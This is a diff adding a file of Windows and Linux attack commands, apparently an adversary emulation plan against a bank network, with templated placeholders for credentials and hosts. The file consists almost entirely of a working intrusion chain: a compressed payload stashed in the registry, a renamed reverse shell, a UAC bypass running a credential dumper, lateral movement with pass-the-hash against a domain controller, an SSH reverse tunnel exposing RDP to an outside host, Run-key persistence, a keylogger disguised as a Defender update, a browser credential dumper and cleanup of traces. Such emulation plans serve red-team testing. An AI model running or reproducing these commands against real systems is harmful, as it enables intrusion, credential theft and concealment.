@@ -1,0 +1,84 @@
+powershell.exe -ExecutionPolicy Bypass -File .\take-screenshot.ps1
+
+
+cmd.exe /c 'REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /f /v "{018247B2CAC14652E}" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'
+
+
+Move-Item reverse.ps1 LanCradDriver.ps1;
+powershell.exe -ExecutionPolicy Bypass -NoExit -File LanCradDriver.ps1
+
+
+powershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1 "cmd.exe /C $pwd\attackkatz.exe > $pwd\MGsCOxPSNK.txt"
+
+
+cat MGsCOxPSNK.txt;
+
+
+New-Item -ItemType Directory -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver;
+Move-Item pscp.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe;
+Move-Item psexec.py C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py;
+Move-Item impacket_exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime;
+Move-Item plink.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe;
+Move-Item tiny.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe;
+
+
+C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/psexec.py;
+C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/runtime;
+C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/tiny;
+
+
+C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe #{domain.admin.username}@#{bankfileserver.ip.address} -pw '#{domain.admin.password}'
+
+
+ps ax
+
+
+ls -lsahR /var/ 2>/dev/null
+
+
+cat /var/tmp/network-diagram-financial.xml
+
+
+cat /var/tmp/help-desk-ticket.txt
+
+
+nslookup bankdc
+
+
+chmod 755 /tmp/runtime && /tmp/runtime /tmp/psexec.py #{domain.name.full}/#{domain.admin.username}@#{bankdc.ip.address} -hashes #{domain.admin.password.hash}
+
+
+Move-Item tiny.exe C:\Windows\tiny.exe;
+C:\Windows\tiny.exe 192.168.0.4 8080
+
+
+Get-ADComputer -Identity 'cfo' -Properties *
+
+
+Move-Item plink.exe C:\Windows\Temp\plink.exe;
+echo n | C:\Windows\Temp\plink.exe -pw "#{attacker.sshuser.password}" #{attacker.sshuser.username}@192.168.0.4 -R 3389:localhost:3389
+
+
+qwinsta /server:cfo
+
+
+Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs & echo Dim strArgs >> C:\Users\Public\Java-Update.vbs & echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs & echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs
+
+
+cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs
+
+
+Move-Item keylogger.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe;
+C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe
+
+
+type C:\Users\#{cfo.user.username}\AppData\Local\Temp\klog2.txt
+
+
+Move-Item dumpWebCreds.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe;
+C:\Users\#{cfo.user.username}\AppData\Local\Temp\infosMin48.exe -i -H
+
+
+Stop-Process -Name DefenderUpgradeExec;
+Remove-Item $env:TEMP\* -Recurse -Force -Erroraction 'silentlycontinue'
